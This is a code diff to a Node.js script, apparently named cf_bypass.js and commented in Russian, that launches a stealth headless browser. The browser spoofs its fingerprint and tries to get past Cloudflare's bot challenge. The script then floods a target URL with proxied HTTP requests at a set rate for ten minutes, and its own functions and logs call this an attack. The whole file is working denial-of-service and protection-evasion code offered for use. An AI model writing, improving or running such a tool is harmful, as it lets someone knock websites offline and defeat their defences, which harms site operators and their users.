@@ -2,124 +2,142 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
 const fs = require('fs');
-const { Worker, isMainThread, workerData } = require('worker_threads');
+const { Worker } = require('worker_threads');
 
+// Глубокие настройки stealth
 puppeteer.use(StealthPlugin());
+puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());
 
-// Конфигурация
-const config = {
-    chromePath: '/usr/bin/google-chrome',
-    userAgents: [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    ],
-    timeout: 30000
-};
+const CHROME_ARGS = [
+    '--no-sandbox',
+    '--disable-setuid-sandbox',
+    '--disable-dev-shm-usage',
+    '--disable-accelerated-2d-canvas',
+    '--disable-gpu',
+    '--lang=en-US,en',
+    '--window-size=1920,1080'
+];
 
-async function runWorker({ targetUrl, proxy, rate }) {
-    console.log(`[+] Инициализация worker для ${targetUrl}`);
+async function attackTarget(targetUrl, proxy, rate) {
+    console.log(`[⚙] Инициализация атаки на ${targetUrl}`);
     
-    let browser;
+    const browser = await puppeteer.launch({
+        headless: 'new',
+        args: [...CHROME_ARGS, `--proxy-server=${proxy}`],
+        ignoreHTTPSErrors: true,
+        executablePath: '/usr/bin/google-chrome'
+    });
+
     try {
-        const launchOptions = {
-            headless: 'new', // Новый headless-режим
-            args: [
-                `--proxy-server=${proxy}`,
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-dev-shm-usage',
-                '--ignore-certificate-errors',
-                '--disable-gpu',
-                '--disable-software-rasterizer',
-                '--disable-xss-auditor'
-            ],
-            ignoreHTTPSErrors: true,
-            executablePath: config.chromePath
-        };
-
-        console.log('[→] Запуск браузера...');
-        browser = await puppeteer.launch(launchOptions);
         const page = await browser.newPage();
-
-        // Настройка User-Agent
-        const userAgent = config.userAgents[0];
-        await page.setUserAgent(userAgent);
-        await page.setJavaScriptEnabled(true);
-
-        console.log(`[→] Переход на ${targetUrl}`);
-        await page.goto(targetUrl, {
-            waitUntil: 'networkidle2',
-            timeout: config.timeout
+        
+        // Детальная настройка фингерпринта
+        await page.setExtraHTTPHeaders({
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118"'
         });
 
-        // Проверка Cloudflare
-        const title = await page.title();
-        console.log(`[i] Заголовок страницы: "${title}"`);
-        
-        if (title.includes('Just a moment')) {
-            console.log('[!] Обнаружен Cloudflare Challenge');
-            await solveChallenge(page);
-        }
+        // Эмуляция человеческого поведения
+        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+        await page.evaluateOnNewDocument(() => {
+            delete navigator.__proto__.webdriver;
+            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
+        });
 
-        console.log('[✓] Подключение установлено');
-        startFlood(targetUrl, proxy, rate, userAgent);
+        console.log(`[🌐] Переход на целевой URL...`);
+        await page.goto(targetUrl, {
+            waitUntil: 'domcontentloaded',
+            timeout: 60000
+        });
+
+        // Расширенная обработка Cloudflare
+        await handleCloudflare(page);
+        
+        console.log(`[✅] Успешное подключение. Запуск флуда...`);
+        startRequestsFlood(targetUrl, proxy, rate);
 
     } catch (error) {
-        console.error(`[×] Критическая ошибка: ${error.message}`);
-        if (browser) await browser.close();
-        process.exit(1);
+        console.error(`[💥] Критическая ошибка: ${error.message}`);
+        await browser.close();
     }
 }
 
-async function solveChallenge(page) {
+async function handleCloudflare(page) {
     try {
-        console.log('[→] Решение challenge...');
-        await page.waitForSelector('#challenge-form', { timeout: 10000 });
-        await page.waitForTimeout(3000);
+        const title = await page.title();
+        if (!title.includes('Just a moment')) return;
+
+        console.log('[🛡] Обнаружена защита Cloudflare');
+        
+        // Расширенная эмуляция человеческого поведения
+        await page.mouse.move(100, 100);
+        await page.waitForTimeout(1500);
+        await page.mouse.move(200, 200);
+        await page.waitForTimeout(1000);
+        
+        // Решение JavaScript Challenge
+        await page.waitForFunction(() => {
+            const el = document.querySelector('#challenge-form');
+            return el && el.offsetParent !== null;
+        }, { timeout: 15000 });
+        
         await page.click('#challenge-form input[type="submit"]');
-        await page.waitForNavigation({ timeout: 15000 });
-        console.log('[✓] Challenge решен');
+        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 20000 });
+        
+        console.log('[✅] Защита успешно пройдена');
     } catch (error) {
-        console.error('[×] Не удалось решить challenge:', error.message);
+        console.error('[❌] Не удалось обойти защиту:', error.message);
         throw error;
     }
 }
 
-function startFlood(targetUrl, proxy, rate, userAgent) {
-    const [host, port] = proxy.split(':');
-    console.log(`[⚡] Запуск флуда (${rate} запр/сек)`);
+function startRequestsFlood(targetUrl, proxy, rate) {
+    const [proxyHost, proxyPort] = proxy.split(':');
+    let requestCount = 0;
 
-    const interval = setInterval(() => {
-        axios.get(targetUrl, {
-            proxy: { host, port: parseInt(port) },
-            headers: { 'User-Agent': userAgent },
-            timeout: 3000
-        })
-        .then(() => process.stdout.write('.'))
-        .catch(() => process.stdout.write('x'));
+    console.log(`[🔥] Запуск флуда с интенсивностью ${rate} запр/сек`);
+    
+    const interval = setInterval(async () => {
+        try {
+            await axios.get(targetUrl, {
+                proxy: {
+                    host: proxyHost,
+                    port: parseInt(proxyPort)
+                },
+                timeout: 5000,
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+                }
+            });
+            process.stdout.write('.');
+            requestCount++;
+        } catch (error) {
+            process.stdout.write('x');
+        }
     }, 1000 / rate);
 
+    // Статистика каждые 10 секунд
+    setInterval(() => {
+        console.log(`\n[📊] Отправлено запросов: ${requestCount}`);
+    }, 10000);
+
+    // Автоматическое завершение через 10 минут
     setTimeout(() => {
         clearInterval(interval);
-        console.log('\n[!] Флуд завершен');
-    }, 300000);
+        console.log('\n[⏱] Атака завершена по таймауту');
+        process.exit(0);
+    }, 600000);
 }
 
-if (isMainThread) {
-    const targetUrl = process.argv[2];
-    const threads = parseInt(process.argv[3]);
-    const proxyFile = process.argv[4];
-    const rate = parseInt(process.argv[5]);
-
-    const proxies = fs.readFileSync(proxyFile, 'utf-8')
-        .split('\n')
-        .filter(p => p.trim().length > 0);
-
-    console.log(`[•] Запуск ${threads} потоков`);
-    new Worker(__filename, { workerData: {
-        targetUrl,
-        proxy: proxies[0],
-        rate
-    }});
-} else {
-    runWorker(workerData);
+// Запуск
+if (process.argv.length < 5) {
+    console.log('Использование: node cf_bypass.js <URL> <proxy:port> <rate>');
+    process.exit(1);
 }
+
+attackTarget(
+    process.argv[2], 
+    process.argv[3], 
+    parseInt(process.argv[4])
+).catch(console.error);
